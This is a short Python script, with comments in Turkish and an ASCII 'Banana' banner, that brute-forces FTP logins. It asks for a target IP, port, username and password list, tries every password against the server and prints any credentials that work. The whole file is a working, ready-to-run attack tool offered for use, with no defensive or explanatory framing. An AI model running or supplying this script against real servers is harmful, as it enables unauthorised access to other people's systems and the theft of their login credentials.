import ftplib
import os
import time

os.system("clear")

print(r"""
  ___                           
 | _ ) __ _ _ _  __ _ _ _  __ _ 
 | _ \/ _` | ' \/ _` | ' \/ _` |
 |___/\__,_|_||_\__,_|_||_\__,_|

""")

# Kullanıcıdan hedef IP ve port al
target = input("📍 Target IP: ")
port_input = input("📡 Target Port (default 21): ")
port = int(port_input) if port_input else 21

# Kullanıcı adı al (boşsa anonymous)
username = input("👤 FTP Username (leave blank for anonymous): ")
if username.strip() == "":
    username = "anonymous"

# Parola listesi tercihi
choice = input("📂 Use ready-made passlist.txt? (y/n): ").lower()

if choice == "y":
    passlist_path = "passlist.txt"
else:
    passlist_path = input("📁 Type your password list path: ")

# Parola listesini yükle
try:
    with open(passlist_path, "r", encoding="utf-8", errors="ignore") as file:
        passwords = file.read().splitlines()
except FileNotFoundError:
    print(f"❌ Password list not found at '{passlist_path}'")
    exit()

print(f"\n🚀 Starting FTP brute-force on {target}:{port} as {username} with {len(passwords)} passwords...\n")

# Parola deneme
for password in passwords:
    try:
        ftp = ftplib.FTP()
        ftp.connect(target, port, timeout=5)
        ftp.login(user=username, passwd=password)
        print(f"\n✅ Success! Username: {username} | Password: {password}")
        ftp.quit()
        break
    except ftplib.error_perm:
        print(f"🔍 Trying password: {password:<30} ❌ Incorrect")
    except Exception as e:
        print(f"⚠️ Error: {e}")
        break
else:
    print("\n❌ Password not found in list.")
